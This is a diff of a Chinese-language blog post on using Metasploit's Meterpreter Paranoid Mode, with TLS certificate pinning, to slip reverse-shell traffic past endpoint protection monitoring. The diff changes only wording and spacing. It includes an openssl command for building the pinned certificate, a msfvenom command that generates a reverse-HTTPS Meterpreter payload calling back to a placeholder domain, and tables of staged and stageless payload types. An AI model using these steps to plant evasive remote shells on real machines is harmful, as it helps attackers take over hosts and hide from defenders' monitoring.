@@ -8,7 +8,7 @@ tags: [流量加密, MSF, 免杀]
 
 # 开宗明义
 
-利用证书锁定过掉流量监控，例如赛某的端点防护。
+利用TLS pinning（证书锁定）过掉流量监控设备，例如赛某的端点防护。
 
 Rapid7将之称为```Paranoid Mode(偏执模式)```，相关wiki：[github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)
 
@@ -16,8 +16,8 @@ Rapid7将之称为```Paranoid Mode(偏执模式)```，相关wiki：[github.com/r
 
 ```shell
 openssl req -new -newkey rsa:4096 -days 36500 -nodes -x509 -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" -keyout cert.key -out cert.crt
-cat cert.key  cert.crt > cert.pem
-rm -f cert.key  cert.crt
+cat cert.key cert.crt > cert.pem
+rm -f cert.key cert.crt
 ```
 
 其中```www.example.com```为回连域名或IP
@@ -30,16 +30,16 @@ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443
 
 支持的payload:
 
-|  Staged (payload.bat\|ps1\|txt\|exe):   |
+|  Staged (payload.bat\|ps1\|txt\|exe):  |
 |  :----  |
-| windows/meterpreter/reverse_winhttps  |
-| windows/meterpreter/reverse_https  |
-| windows/x64/meterpreter/reverse_https  |
+|  windows/meterpreter/reverse_winhttps  |
+|  windows/meterpreter/reverse_https  |
+|  windows/x64/meterpreter/reverse_https  |
 
-|  Stageless (binary.exe):   |
+|  Stageless (binary.exe):  |
 |  :----  |
-| windows/meterpreter_reverse_https  |
-| windows/x64/meterpreter_reverse_https  |
+|  windows/meterpreter_reverse_https  |
+|  windows/x64/meterpreter_reverse_https  |
 
 
 # 设置监听
